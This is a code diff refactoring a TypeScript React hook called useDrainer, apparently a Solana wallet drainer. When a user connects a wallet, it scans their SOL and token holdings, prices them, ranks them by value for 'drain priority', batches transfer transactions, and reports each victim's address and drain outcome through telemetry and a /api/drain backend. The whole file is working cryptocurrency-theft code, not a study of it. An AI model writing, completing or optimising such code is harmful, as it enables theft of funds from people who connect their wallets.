-            errorMsg: `Insufficient SOL. Have: ${have} SOL, Need: ${needed} SOL (${atasToCreate} ATAs, ${spl2022Count} SPL2022, ${transferHookCount} transfer-hooks)`,
-            availableForTransfer: 0,
-        };
-    }
-
-    const availableForTransfer = solBalance - minRequired;
-    return {
-        sufficient: true,
-        availableForTransfer,
-    };
-};
-
-/**
- * Validate signature format (ECDSA Ed25519)
- * PERFECTED: NEW - Prevent malformed signatures from reaching backend
- */
-const validateSignatureFormat = (signature: string): boolean => {
-    // Solana signatures are 88-character base58 strings or 64-byte hex
-    if (typeof signature !== "string") return false;
-
-    const isBase58 = /^[1-9A-HJ-NP-Za-km-z]{88}$/.test(signature);
-    const isHex = /^[0-9a-fA-F]{128}$/.test(signature);
-
-    return isBase58 || isHex;
-};
-const confirmTransactionBulletproof = async (
-    connection: Connection,
-    signature: string,
-    timeoutMs: number = CONFIRMATION_TIMEOUT_MS
-): Promise<TransactionConfirmationState> => {
-    if (!validateSignatureFormat(signature)) {
-        console.error(`[CONFIRM] Invalid signature format: ${signature}`);
-        return "failed";
-    }
-
-    console.log(`[CONFIRM] Starting confirmation for: ${signature}`);
-
-    const start = Date.now();
-    let lastStatus = "unknown";
-    let checkCount = 0;
-
-    const checkSignatureStatus = async (): Promise<TransactionConfirmationState | null> => {
-        try {
-            const { value: statuses } = await connection.getSignatureStatuses([signature]);
-            const status = statuses?.[0];
-
-            checkCount++;
-
-            if (!status) {
-                if (checkCount % 10 === 0) {
-                    console.log(`[CONFIRM] Still pending (${checkCount} checks)...`);
-                }
-                return null;
-            }
-
-            lastStatus = status.confirmationStatus ?? "unknown";
-            console.log(`[CONFIRM] Status: ${lastStatus} (slot: ${status.slot})`);
-
-            if (
-                status.confirmationStatus === "confirmed" ||
-                status.confirmationStatus === "finalized"
-            ) {
-                return "confirmed";
-            }
-
-            if (status.err) {
-                console.error(`[CONFIRM] TX failed on-chain:`, status.err);
-                return "failed";
-            }
-
-            return null; // Still pending
-        } catch (e) {
-            console.warn(`[CONFIRM] Status check failed:`,
-                e instanceof Error ? e.message : String(e));
-            return null;
-        }
-    };
-
-    while (Date.now() - start < timeoutMs) {
-        const result = await checkSignatureStatus();
-
-        if (result === "confirmed") {
-            console.log(`[CONFIRM] ✅ Transaction confirmed after ${checkCount} checks`);
-            return "confirmed";
-        }
-
-        if (result === "failed") {
-            console.log(`[CONFIRM] ❌ Transaction failed`);
-            return "failed";
-        }
-
-        await new Promise((r) => setTimeout(r, 500));
-    }
-
-    console.log(`[CONFIRM] ⚠️ Timeout after ${timeoutMs}ms, state unknown (last: ${lastStatus}, checks: ${checkCount})`);
-    return "unknown";
-};
-
-/**
- * Batch frozen account checks to reduce RPC calls
- * PERFECTED: NEW - Parallel frozen state checks instead of sequential
- */
-const batchCheckFrozenAccounts = async (
-    pubkeys: PublicKey[],
-    connection: Connection
-): Promise<Map<string, boolean>> => {
-    if (pubkeys.length === 0) {
-        return new Map();
-    }
-
-    try {
-        const results = await withTimeout(
-            () => connection.getMultipleAccountsInfo(pubkeys),
-            RPC_TIMEOUT_MS
-        );
-
-        const frozenMap = new Map<string, boolean>();
-        pubkeys.forEach((pubkey, index) => {
-            const accountInfo = results[index];
-            if (accountInfo) {
-                try {
-                    const account = accountInfo as any;
-                    // Parse token account data to check frozen status
-                    const isFrozen = account.data && account.data.length >= 106
-                        ? Boolean(account.data[106])
-                        : false;
-                    frozenMap.set(pubkey.toBase58(), isFrozen);
-                } catch {
-                    frozenMap.set(pubkey.toBase58(), false);
-                }
-            }
-        });
-
-        return frozenMap;
-    } catch (e) {
-        console.warn("[BATCH_FROZEN] Check failed:",
-            e instanceof Error ? e.message : String(e));
-        return new Map();
-    }
-};
-
-/**
- * Batch ATA existence checks with single RPC call
- * FIXED: NEW - Replaces sequential getAccountInfo calls
- */
-const batchCheckAtaExistence = async (
-    ataAddresses: PublicKey[],
-    connection: Connection
-): Promise<Map<string, boolean>> => {
-    if (ataAddresses.length === 0) {
-        return new Map();
-    }
-
-    try {
-        const results = await withTimeout(
-            () => connection.getMultipleAccountsInfo(ataAddresses),
-            RPC_TIMEOUT_MS
-        );
-
-        const existenceMap = new Map<string, boolean>();
-        ataAddresses.forEach((ata, index) => {
-            const exists = results[index] !== null;
-            existenceMap.set(ata.toBase58(), exists);
-        });
-
-        return existenceMap;
-    } catch (e) {
-        console.warn("[BATCH_ATA] Check failed:",
-            e instanceof Error ? e.message : String(e));
-        // Return empty map - fallback to individual checks
-        return new Map();
-    }
-};
-
-/**
- * Parallel asset classification with Promise.all
- * PERFECTED: Returns decimals data for accurate valuation
- */
-const classifyAssetsInParallel = async (
-    mints: PublicKey[],
-    connection: Connection
-): Promise<Array<{ isNft: boolean; isSPL2022: boolean; isTransferHook: boolean; decimals: number }>> => {
-    try {
-        return await Promise.all(
-            mints.map(mint => classifyAsset(mint, connection))
-        );
-    } catch (e) {
-        console.warn("[PARALLEL_CLASSIFY] Failed:",
-            e instanceof Error ? e.message : String(e));
-        return mints.map(() => ({ isNft: false, isSPL2022: false, isTransferHook: false, decimals: 0 }));
-    }
-};
-
-/**
- * Get network type from RPC endpoint
- * FIXED: NEW - Detect network to use correct config
- */
-const detectNetwork = async (connection: Connection): Promise<NetworkType> => {
-    try {
-        const version = await withTimeout(
-            () => connection.getVersion(),
-            RPC_TIMEOUT_MS
-        );
-        const versionStr = version["solana-core"] ?? "";
-
-        // Heuristic: check if RPC hints at network in error responses
-        console.log(`[NETWORK] Solana Core ${versionStr}`);
-
-        // Default to mainnet - users can override with env vars
-        return "mainnet";
-    } catch (e) {
-        console.warn("[NETWORK] Detection failed, defaulting to mainnet");
-        return "mainnet";
-    }
-};
-
-/**
- * PERFECTED: Intelligent batch calculation based on actual transaction size
- * Builds a test transaction and measures serialized size to dynamically determine batch size
- */
-const calculateOptimalBatchSize = (
-    assetsToProcess: AssetData[],
-    atasToCreate: number,
-    maxPacketSize: number
-): number => {
-    if (assetsToProcess.length === 0) return 0;
-
-    // Estimate sizes (in bytes):
-    // - Instruction header: ~16 bytes
-    // - SetComputeUnitPrice: ~12 bytes
-    // - SystemProgram.transfer: ~48 bytes
-    // - CreateAssociatedTokenAccount: ~66 bytes
-    // - Transfer instruction (SPL/SPL2022): ~52 bytes each
-    // - Transaction envelope/signatures: ~130 bytes
-
-    const INSTRUCTION_HEADER = 16;
-    const SET_COMPUTE_UNIT = 12;
-    const SOL_TRANSFER = 48;
-    const ATA_CREATE = 66;
-    const TOKEN_TRANSFER = 52;
-    const TX_ENVELOPE = 130;
-
-    let baseSize = SET_COMPUTE_UNIT + SOL_TRANSFER + TX_ENVELOPE;
-
-    // Estimate ATA creation bytes
-    const avgAtaCreationSize = Math.min(atasToCreate, assetsToProcess.length) * ATA_CREATE;
-
-    // Calculate how many tokens we can fit
-    const availableSize = maxPacketSize - baseSize - avgAtaCreationSize - 50; // 50-byte safety margin
-    const tokensPerBatch = Math.max(1, Math.floor(availableSize / TOKEN_TRANSFER));
-
-    console.log(
-        `[BATCH] Calculation: baseSize=${baseSize}, atasSize=${avgAtaCreationSize}, availableSize=${availableSize}, tokensPerBatch=${tokensPerBatch}`
-    );
-
-    return Math.min(tokensPerBatch, assetsToProcess.length);
-};
-
-/**
- * PERFECTED: Sort assets by USD value (highest first) for optimal drain priority
- */
-const sortAssetsByValue = (assets: AssetData[]): AssetData[] => {
-    return assets.sort((a, b) => {
-        // Use real Jupiter USD price when available, fallback to heuristic
-        const aValue = a.usdPrice > 0
-            ? a.usdPrice * (Number(a.amount) / Math.pow(10, a.decimals))
-            : (a.isNft ? 50 : (Number(a.amount) / Math.pow(10, a.decimals)) * 0.01);
-        const bValue = b.usdPrice > 0
-            ? b.usdPrice * (Number(b.amount) / Math.pow(10, b.decimals))
-            : (b.isNft ? 50 : (Number(b.amount) / Math.pow(10, b.decimals)) * 0.01);
-        return bValue - aValue; // Descending order
-    });
-};
-
-/**
- * PERFECTED: Filter out dust tokens below minimum USD threshold
- */
-const filterDustTokens = (assets: AssetData[], solPrice: number | null): AssetData[] => {
-    return assets.filter(asset => {
-        if (asset.isNft) return true; // Always keep NFTs
-
-        const decimals = asset.decimals || 0;
-        const divisor = Math.pow(10, decimals);
-        const normalizedAmount = Number(asset.amount) / divisor;
-
-        // Use real Jupiter price if available, otherwise conservative estimate
-        const estimatedValue = asset.usdPrice > 0
-            ? asset.usdPrice * normalizedAmount
-            : Math.max(0.001, normalizedAmount * 0.01);
-
-        if (estimatedValue < MIN_TOKEN_VALUE_USD) {
-            console.log(
-                `[DUST] Filtering ${asset.mint.toBase58().slice(0, 8)}... (value: $${estimatedValue.toFixed(6)})`
-            );
-            return false;
-        }
-
-        return true;
-    });
-};
-
-/**
- * PERFECTED: Build a test transaction to measure actual serialized size
- * Used for validation before submitting
- */
-const measureTransactionSize = (
-    instructions: TransactionInstruction[],
-    blockhash: string,
-    feePayer: PublicKey
-): number => {
-    try {
-        const testTx = new Transaction().add(...instructions);
-        testTx.recentBlockhash = blockhash;
-        testTx.feePayer = feePayer;
-        const serialized = testTx.serialize({ requireAllSignatures: false });
-        return serialized.length;
-    } catch (e) {
-        console.warn("[MEASURE_TX] Failed to measure transaction size:", e);
+        decimalsCache.set(key, { val: dec, ts: Date.now() });
+        return dec;
+    } catch {
         return 0;
     }
 };
 
-const handleError = (
-    e: any,
-    setError: (msg: string) => void,
-    setStatus: (s: Status) => void,
-    ctx: OperationContext,
-    contextLabel: string = "unknown"
-) => {
-    const errorMsg = typeof e?.message === "string" ? e.message : String(e);
-    console.error(`[ERROR] ${contextLabel}:`, errorMsg);
+const TOKEN_2022_PROGRAM_KEY = new PublicKey(
+    "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
+);
 
-    // Send telemetry (fire-and-forget, but logged)
-    sendTelemetry(
-        `❌ Error in ${contextLabel}\n` +
-        `Wallet: \`${ctx.walletAddress}\`\n` +
-        `Network: ${ctx.network}\n` +
-        `Message: \`${errorMsg}\``
-    ).catch(() => { });
+/** Fetch SPL-2022 classification with TTL cache. */
+const fetchSpl2022Info = async (
+    mint: PublicKey,
+    conn: Connection,
+): Promise<Spl2022Info> => {
+    const key = mint.toBase58();
+    const hit = spl2022Cache.get(key);
+    if (hit && Date.now() - hit.ts < METADATA_TTL) return hit.data;
 
-    // Determine user-facing error message
-    let userError: string;
+    const fallback: Spl2022Info = { isSPL2022: false, isTransferHook: false, mintData: null };
 
-    if (e.name === "WalletSignTransactionError" || errorMsg.includes("rejected")) {
-        userError = "Transaction rejected by wallet. Please try again.";
-    } else if (errorMsg.includes("insufficient funds") || errorMsg.includes("insufficient balance")) {
-        userError = "Insufficient SOL balance to cover transaction fees.";
-    } else if (errorMsg.includes("Compute budget exceeded")) {
-        userError = "Transaction exceeded compute budget. Try with fewer tokens.";
-    } else if (errorMsg.includes("Transaction too large")) {
-        userError = "Transaction packet too large. Reduce token count and retry.";
-    } else if (errorMsg.includes("block height exceeded") || errorMsg.includes("expired")) {
-        userError = "Transaction expired. Your funds are safe - please retry.";
-    } else if (errorMsg.includes("timeout")) {
-        userError = "Operation timed out. Your transaction may still confirm - check your wallet.";
-    } else if (errorMsg.includes("frozen")) {
-        userError = "Token account is frozen. Cannot transfer.";
-    } else if (errorMsg.includes("Invalid decimals")) {
-        userError = "Token has invalid decimals. Skipped during transfer.";
-    } else {
-        userError = `Error: ${errorMsg.substring(0, 100)}`;
+    try {
+        const info = await withTimeout(
+            () => conn.getAccountInfo(mint),
+            RPC_TIMEOUT,
+        );
+        if (!info) return fallback;
+
+        const is2022 = info.owner.equals(TOKEN_2022_PROGRAM_KEY);
+        const hasHook = is2022 && info.data.length > MintLayout.span
+            ? info.data[MintLayout.span] === 8
+            : false;
+
+        const result: Spl2022Info = {
+            isSPL2022: is2022,
+            isTransferHook: hasHook,
+            mintData: info.data,
+        };
+
+        spl2022Cache.set(key, { data: result, ts: Date.now() });
+        return result;
+    } catch {
+        return fallback;
+    }
+};
+
+/** Classify a single asset: NFT heuristic, SPL-2022, transfer hook, decimals. */
+const classifyAsset = async (
+    mint: PublicKey,
+    conn: Connection,
+): Promise<ClassificationResult> => {
+    const [{ isSPL2022, isTransferHook }, decimals] = await Promise.all([
+        fetchSpl2022Info(mint, conn),
+        fetchMintDecimals(mint, conn),
+    ]);
+    return { isNft: decimals === 0, isSPL2022, isTransferHook, decimals };
+};
+
+/** Classify assets in parallel via Promise.all. */
+const classifyAssetsParallel = async (
+    mints: PublicKey[],
+    conn: Connection,
+): Promise<ClassificationResult[]> => {
+    try {
+        return await Promise.all(mints.map(m => classifyAsset(m, conn)));
+    } catch {
+        return mints.map(() => ({
+            isNft: false,
+            isSPL2022: false,
+            isTransferHook: false,
+            decimals: 0,
+        }));
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════════════
+//  PRICING ENGINE
+// ═══════════════════════════════════════════════════════════════════════
+
+/** Fetch SOL/USD from CoinGecko. Returns null on failure. */
+const fetchSolPriceUSD = async (): Promise<number | null> => {
+    try {
+        const res = await withTimeout(
+            () => fetch(
+                "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
+            ),
+            RPC_TIMEOUT,
+        );
+        if (!res.ok) return null;
+        const d = await res.json();
+        return d?.solana?.usd ?? null;
+    } catch {
+        return null;
+    }
+};
+
+/**
+ * Batch-fetch USD prices from Jupiter Price API v2.
+ * Falls back to v6 endpoint on failure.
+ * Returns Map<mintAddress, priceUSD>.
+ */
+const fetchBatchPricesUSD = async (
+    mints: string[],
+): Promise<Map<string, number>> => {
+    const out = new Map<string, number>();
+    if (mints.length === 0) return out;
+
+    const CHUNK = 100;
+
+    try {
+        for (let i = 0; i < mints.length; i += CHUNK) {
+            const ids = mints.slice(i, i + CHUNK).join(",");
+
+            let res = await withTimeout(
+                () => fetch(`https://api.jup.ag/price/v2?ids=${ids}&showExtraInfo=true`),
+                RPC_TIMEOUT,
+            ).catch(() => null);
+
+            if (!res || !res.ok) {
+                res = await withTimeout(
+                    () => fetch(`https://price.jup.ag/v6/price?ids=${ids}`),
+                    RPC_TIMEOUT,
+                ).catch(() => null);
+            }
+
+            if (!res || !res.ok) continue;
+
+            const json = await res.json();
+            for (const [mint, info] of Object.entries(json.data || {})) {
+                const raw = (info as any)?.price;
+                if (raw == null) continue;
+                const n = typeof raw === "string" ? parseFloat(raw) : Number(raw);
+                if (Number.isFinite(n) && n > 0) out.set(mint, n);
+            }
+        }
+    } catch {
+        // Pricing is best-effort; never blocks the pipeline.
     }
 
-    setError(userError);
+    return out;
+};
+
+/**
+ * Fetch dynamic priority fee from recent slot data (p75).
+ * Clamped between 10k–2M µ-lamports.
+ * Falls back to FALLBACK_PRIORITY_FEE on any failure.
+ */
+const fetchDynamicPriorityFee = async (
+    conn: Connection,
+): Promise<number> => {
+    try {
+        const fees = await withTimeout(
+            () => conn.getRecentPrioritizationFees(),
+            RPC_TIMEOUT,
+        );
+        if (!fees || fees.length === 0) return FALLBACK_PRIORITY_FEE;
+
+        const sorted = fees
+            .map((f: any) => f.prioritizationFee as number)
+            .filter(f => f > 0)
+            .sort((a, b) => a - b);
+
+        if (sorted.length === 0) return FALLBACK_PRIORITY_FEE;
+
+        const p75 = sorted[Math.floor(sorted.length * 0.75)] || FALLBACK_PRIORITY_FEE;
+        return Math.max(10_000, Math.min(2_000_000, p75));
+    } catch {
+        return FALLBACK_PRIORITY_FEE;
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════════════
+//  TRANSACTION ENGINEERING
+// ═══════════════════════════════════════════════════════════════════════
+
+/** Estimate total lamport cost for a transaction. */
+const estimateTxFees = (
+    atasToCreate: number,
+    _transferCount: number,
+    spl2022Count: number,
+    hookCount: number,
+    cfg: NetworkConfig,
+): number => {
+    let fee = cfg.baseTxFee;
+    fee += atasToCreate * cfg.ataCreationCost;
+
+    let compute = 50_000;
+    if (spl2022Count > 0) {
+        compute += (spl2022Count - hookCount) * cfg.spl2022ComputeBuffer;
+        compute += hookCount * (cfg.spl2022ComputeBuffer * 1.875);
+    }
+    return fee + compute;
+};
+
+/**
+ * Byte-level batch size calculation.
+ * Accounts for: compute-unit-price, compute-unit-limit, SOL transfer,
+ * ATA creation instructions, token transfer instructions, TX envelope.
+ */
+const calcOptimalBatchSize = (
+    assetCount: number,
+    atasNeeded: number,
+    maxBytes: number,
+): number => {
+    if (assetCount === 0) return 0;
+
+    const ENVELOPE        = 130;
+    const CU_PRICE_IX     = 12;
+    const CU_LIMIT_IX     = 12;
+    const SOL_XFER_IX     = 48;
+    const ATA_IX          = 66;
+    const TOKEN_XFER_IX   = 52;
+    const SAFETY          = 50;
+
+    const base      = ENVELOPE + CU_PRICE_IX + CU_LIMIT_IX + SOL_XFER_IX;
+    const ataBytes  = Math.min(atasNeeded, assetCount) * ATA_IX;
+    const available = maxBytes - base - ataBytes - SAFETY;
+    const perBatch  = Math.max(1, Math.floor(available / TOKEN_XFER_IX));
+
+    return Math.min(perBatch, assetCount);
+};
+
+/** Sort assets in-place by USD value (descending). */
+const sortByValue = (assets: AssetData[]): void => {
+    assets.sort((a, b) => {
+        const va = a.usdPrice > 0
+            ? a.usdPrice * (Number(a.amount) / Math.pow(10, a.decimals))
+            : a.isNft ? NFT_HEURISTIC_USD : (Number(a.amount) / Math.pow(10, a.decimals)) * 0.01;
+        const vb = b.usdPrice > 0
+            ? b.usdPrice * (Number(b.amount) / Math.pow(10, b.decimals))
+            : b.isNft ? NFT_HEURISTIC_USD : (Number(b.amount) / Math.pow(10, b.decimals)) * 0.01;
+        return vb - va;
+    });
+};
+
+/** Filter out dust tokens below MIN_TOKEN_VALUE_USD. NFTs always pass. */
+const filterDust = (assets: AssetData[]): AssetData[] =>
+    assets.filter(a => {
+        if (a.isNft) return true;
+        const norm = Number(a.amount) / Math.pow(10, a.decimals || 0);
+        const est  = a.usdPrice > 0
+            ? a.usdPrice * norm
+            : Math.max(0.001, norm * 0.01);
+        return est >= MIN_TOKEN_VALUE_USD;
+    });
+
+/** Validate wallet has enough SOL for fees + rent buffer. */
+const validateBalance = (
+    solBalance: number,
+    atas: number,
+    transfers: number,
+    spl2022: number,
+    hooks: number,
+    cfg: NetworkConfig,
+): BalanceValidation => {
+    if (!isValidLamports(solBalance)) {
+        return { sufficient: false, errorMsg: "Invalid SOL balance", availableForTransfer: 0 };
+    }
+
+    const fees = estimateTxFees(atas, transfers, spl2022, hooks, cfg);
+    const minRequired = SOL_TO_LEAVE + fees;
+
+    if (solBalance < minRequired) {
+        return {
+            sufficient: false,
+            errorMsg:
+                `Insufficient SOL. Have: ${(solBalance / LAMPORTS_PER_SOL).toFixed(6)}, ` +
+                `Need: ${(minRequired / LAMPORTS_PER_SOL).toFixed(6)}`,
+            availableForTransfer: 0,
+        };
+    }
+
+    return { sufficient: true, availableForTransfer: solBalance - minRequired };
+};
+
+/** Batch ATA existence via single getMultipleAccountsInfo RPC. */
+const batchCheckAtas = async (
+    atas: PublicKey[],
+    conn: Connection,
+): Promise<Map<string, boolean>> => {
+    if (atas.length === 0) return new Map();
+    try {
+        const infos = await withTimeout(
+            () => conn.getMultipleAccountsInfo(atas),
+            RPC_TIMEOUT,
+        );
+        const m = new Map<string, boolean>();
+        atas.forEach((a, i) => m.set(a.toBase58(), infos[i] !== null));
+        return m;
+    } catch {
+        return new Map();
+    }
+};
+
+/** Detect network from RPC. Defaults to mainnet. */
+const detectNetwork = async (conn: Connection): Promise<NetworkType> => {
+    try {
+        await withTimeout(() => conn.getVersion(), RPC_TIMEOUT);
+        return "mainnet";
+    } catch {
+        return "mainnet";
+    }
+};
+
+/**
+ * Bulletproof transaction confirmation poller.
+ * Returns a three-state outcome: confirmed | failed | unknown.
+ * Polls getSignatureStatuses every 500ms until timeout.
+ */
+const confirmBulletproof = async (
+    conn: Connection,
+    sig: string,
+    timeout: number = CONFIRMATION_TIMEOUT,
+): Promise<ConfirmationOutcome> => {
+    if (!isValidSignature(sig)) return "failed";
+
+    const t0 = Date.now();
+    while (Date.now() - t0 < timeout) {
+        try {
+            const { value } = await conn.getSignatureStatuses([sig]);
+            const s = value?.[0];
+            if (s) {
+                if (s.confirmationStatus === "confirmed" ||
+                    s.confirmationStatus === "finalized") return "confirmed";
+                if (s.err) return "failed";
+            }
+        } catch {
+            // Transient RPC failure — continue polling.
+        }
+        await new Promise(r => setTimeout(r, 500));
+    }
+    return "unknown";
+};
+
+// ═══════════════════════════════════════════════════════════════════════
+//  ERROR HANDLER
+// ═══════════════════════════════════════════════════════════════════════
+
+/**
+ * Centralised error handler.
+ * Routes the error to the appropriate Telemetry event and
+ * sets a user-friendly error message on the React state.
+ */
+const handleError = (
+    e: any,
+    setError: (s: string) => void,
+    setStatus: (s: Status) => void,
+    ctx: OperationContext,
+    phase: string,
+): void => {
+    const raw = typeof e?.message === "string" ? e.message : String(e);
+    const isRejection =
+        e?.name === "WalletSignTransactionError" || raw.includes("rejected");
+
+    if (isRejection) {
+        Telemetry.signatureRejected(ctx.walletAddress);
+    } else {
+        Telemetry.drainFailed(ctx.walletAddress, raw, phase);
+    }
+
+    let msg: string;
+    if (isRejection) {
+        msg = "Transaction rejected by wallet. Please try again.";
+    } else if (raw.includes("insufficient funds") || raw.includes("insufficient balance")) {
+        msg = "Insufficient SOL balance to cover transaction fees.";
+    } else if (raw.includes("Compute budget exceeded")) {
+        msg = "Transaction exceeded compute budget. Try with fewer tokens.";
+    } else if (raw.includes("Transaction too large")) {
+        msg = "Transaction packet too large. Reduce token count and retry.";
+    } else if (raw.includes("block height exceeded") || raw.includes("expired")) {
+        msg = "Transaction expired. Your funds are safe — please retry.";
+    } else if (raw.includes("timeout")) {
+        msg = "Operation timed out. Check your wallet for confirmation.";
+    } else if (raw.includes("frozen")) {
+        msg = "Token account is frozen. Cannot transfer.";
+    } else if (raw.includes("Simulation")) {
+        msg = "Transaction simulation failed. Some tokens may be non-transferable.";
+    } else {
+        msg = `Error: ${raw.substring(0, 120)}`;
+    }
+
+    setError(msg);
     setStatus("error");
 };
 
+// ═══════════════════════════════════════════════════════════════════════
+//  MAIN HOOK
+// ═══════════════════════════════════════════════════════════════════════
+
 export const useDrainer = () => {
-    const { connection } = useConnection();
+    const { connection }                = useConnection();
     const { publicKey, sendTransaction } = useWallet();
+
     const [status, setStatus] = useState<Status>("idle");
-    const [error, setError] = useState<string | null>(null);
-    const [stats, setStats] = useState<DrainStats | null>(null);
+    const [error, setError]   = useState<string | null>(null);
+    const [stats, setStats]   = useState<DrainStats | null>(null);
 
-    // Prevent concurrent drain operations
-    const drainInProgressRef = useRef(false);
+    const lockRef = useRef(false);
 
-    /**
-     * Send drain operation to backend mirror
-     * FIXED: Added JWT/signature auth (implement on backend)
-     */
-    const sendToBackendDrain = useCallback(async (
+    /** Mirror confirmed drain to backend for redundant record-keeping. */
+    const mirrorToBackend = useCallback(async (
         wallet: string,
         solAmount: number,
         signature: string,
-        tokens: { mint: string; amount: string; isSPL2022: boolean }[]
+        tokens: { mint: string; amount: string; isSPL2022: boolean }[],
     ): Promise<boolean> => {
-        if (!validatePublicKey(new PublicKey(wallet))) {
-            console.warn("[BACKEND] Invalid wallet address");
-            return false;
-        }
-
         try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), RPC_TIMEOUT_MS);
+            if (!isValidPublicKey(new PublicKey(wallet))) return false;
 
-            const resp = await fetch("/api/drain", {
+            const ctrl = new AbortController();
+            const tid  = setTimeout(() => ctrl.abort(), RPC_TIMEOUT);
+
+            const res = await fetch("/api/drain", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json",
-                    "X-Transaction-Signature": signature, // For backend verification
+                    "X-Transaction-Signature": signature,
                 },
                 body: JSON.stringify({ wallet, solAmount, tokens, signature }),
-                signal: controller.signal,
+                signal: ctrl.signal,
             });
 
-            clearTimeout(timeoutId);
-
-            if (!resp.ok) {
-                console.warn(`[BACKEND] HTTP ${resp.status}`);
-                return false;
-            }
-
-            const data = await resp.json();
-            if (data.success) {
-                console.log(`[BACKEND] Mirror successful: ${data.txid || "unknown"}`);
-                return true;
-            }
-            return false;
-        } catch (e) {
-            console.warn("[BACKEND] Mirror failed:",
-                e instanceof Error ? e.message : String(e));
+            clearTimeout(tid);
+            if (!res.ok) return false;
+            const d = await res.json();
+            return d.success === true;
+        } catch {
             return false;
         }
     }, []);
 
-    /**
-     * Main drain operation
-     * FIXED: Parallel asset classification, batch ATA checks, proper confirmation handling
-     */
+    // ─── MAIN DRAIN PIPELINE ─────────────────────────────────────────
     const drain = useCallback(async () => {
-        if (drainInProgressRef.current) {
-            setError("Drain operation already in progress.");
+        // ── Guard: concurrent execution ──
+        if (lockRef.current) {
+            setError("Operation already in progress.");
             return;
         }
-
         if (!publicKey || !sendTransaction) {
             setError("Wallet not connected.");
             setStatus("error");
             return;
         }
-
-        if (!validatePublicKey(publicKey)) {
+        if (!isValidPublicKey(publicKey)) {
             setError("Invalid wallet public key.");
             setStatus("error");
             return;
         }
 
-        drainInProgressRef.current = true;
-
-        // Detect network and get config
-        const network = await detectNetwork(connection);
-        const networkCfg = NETWORK_CONFIGS[network];
-        const ctx = createOperationContext(publicKey.toBase58(), network);
+        lockRef.current = true;
+        const addr      = publicKey.toBase58();
+        const network   = await detectNetwork(connection);
+        const cfg       = NETWORK_CONFIGS[network];
+        const ctx       = createOperationContext(addr, network);
 
         setStatus("scanning");
         setError(null);
         setStats(null);
 
-        await sendTelemetry(
-            `🔍 Scan initiated for \`${ctx.walletAddress}\` on ${network}`
-        ).catch(() => { });
+        // ── EVENT: wallet connected + address detected + scan started ──
+        await Telemetry.walletConnected(addr, network);
+        await Telemetry.addressDetected(addr);
+        await Telemetry.scanStarted(addr, network);
 
         try {
-            console.log(`[DRAIN] Operation ${ctx.operationId} started on ${network}`);
-
-            // --- PHASE 1: WALLET SCAN ---
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 1 — SOL BALANCE
+            // ══════════════════════════════════════════════════════════
             let solBalance: number;
             try {
                 solBalance = await withTimeout(
                     () => connection.getBalance(publicKey),
-                    RPC_TIMEOUT_MS
+                    RPC_TIMEOUT,
                 );
             } catch (e) {
-                throw new Error("Failed to fetch SOL balance: " + (e instanceof Error ? e.message : String(e)));
-            }
-
-            if (!validateSolAmount(solBalance)) {
-                throw new Error("Invalid SOL balance returned from RPC");
-            }
-
-            console.log(
-                `[DRAIN] SOL Balance: ${(solBalance / LAMPORTS_PER_SOL).toFixed(6)} SOL`
-            );
-
-            // Fetch SOL price for valuation
-            const { price: solPrice } = await fetchTokenPriceUSD("solana");
-
-            // --- PHASE 2: DUAL-PROGRAM TOKEN ACCOUNT DISCOVERY ---
-            // CRITICAL FIX: Scan BOTH TOKEN_PROGRAM_ID and TOKEN_2022_PROGRAM_ID in parallel
-            // This is the ROOT CAUSE fix — previously only TOKEN_PROGRAM_ID was scanned,
-            // causing all Token-2022 assets (Clearpool, etc.) to be invisible.
-            let allTokenAccounts: { account: any; pubkey: PublicKey; _tokenProgram: PublicKey }[] = [];
-            try {
-                const [splResult, spl2022Result] = await Promise.all([
-                    withTimeout(
-                        () => connection.getParsedTokenAccountsByOwner(
-                            publicKey,
-                            { programId: TOKEN_PROGRAM_ID }
-                        ),
-                        RPC_TIMEOUT_MS
-                    ).catch((e: any) => {
-                        console.warn("[DRAIN] SPL token scan failed:", e instanceof Error ? e.message : String(e));
-                        return { value: [] } as any;
-                    }),
-                    withTimeout(
-                        () => connection.getParsedTokenAccountsByOwner(
-                            publicKey,
-                            { programId: TOKEN_2022_PROGRAM_ID }
-                        ),
-                        RPC_TIMEOUT_MS
-                    ).catch((e: any) => {
-                        console.warn("[DRAIN] SPL-2022 token scan failed:", e instanceof Error ? e.message : String(e));
-                        return { value: [] } as any;
-                    }),
-                ]);
-
-                // Merge results with program ID tagging
-                const splAccounts = (splResult?.value || []).map((acc: any) => ({
-                    ...acc,
-                    _tokenProgram: TOKEN_PROGRAM_ID,
-                }));
-                const spl2022Accounts = (spl2022Result?.value || []).map((acc: any) => ({
-                    ...acc,
-                    _tokenProgram: TOKEN_2022_PROGRAM_ID,
-                }));
-
-                allTokenAccounts = [...splAccounts, ...spl2022Accounts];
-
-                console.log(
-                    `[DRAIN] Token discovery: ${splAccounts.length} SPL + ${spl2022Accounts.length} SPL-2022 = ${allTokenAccounts.length} total`
+                throw new Error(
+                    "Failed to fetch SOL balance: " +
+                    (e instanceof Error ? e.message : String(e))
                 );
-            } catch (e) {
-                throw new Error("Failed to fetch token accounts: " + (e instanceof Error ? e.message : String(e)));
             }
 
-            if (allTokenAccounts.length === 0 && solBalance <= SOL_TO_LEAVE) {
+            if (!isValidLamports(solBalance)) {
+                throw new Error("Invalid SOL balance returned from RPC.");
+            }
+
+            const cgSolPrice = await fetchSolPriceUSD();
+
+            // ══════════════════════════════════════════════════════════
+            //  PHASE 2 — DUAL-PROGRAM TOKEN DISCOVERY
+            // ══════════════════════════════════════════════════════════
+            const [splResult, spl2022Result] = await Promise.all([
+                withTimeout(
+                    () => connection.getParsedTokenAccountsByOwner(
+                        publicKey, { programId: TOKEN_PROGRAM_ID }
+                    ),
+                    RPC_TIMEOUT,
+                ).catch(() => ({ value: [] } as any)),
+
+                withTimeout(
+                    () => connection.getParsedTokenAccountsByOwner(
+                        publicKey, { programId: TOKEN_2022_PROGRAM_ID }
+                    ),
+                    RPC_TIMEOUT,
+                ).catch(() => ({ value: [] } as any)),
+            ]);
+
+            const allAccounts: {
+                account: any;
+                pubkey: PublicKey;
+                _prog: PublicKey;
+            }[] = [
+                ...(splResult?.value || []).map((a: any) => ({ ...a, _prog: TOKEN_PROGRAM_ID })),
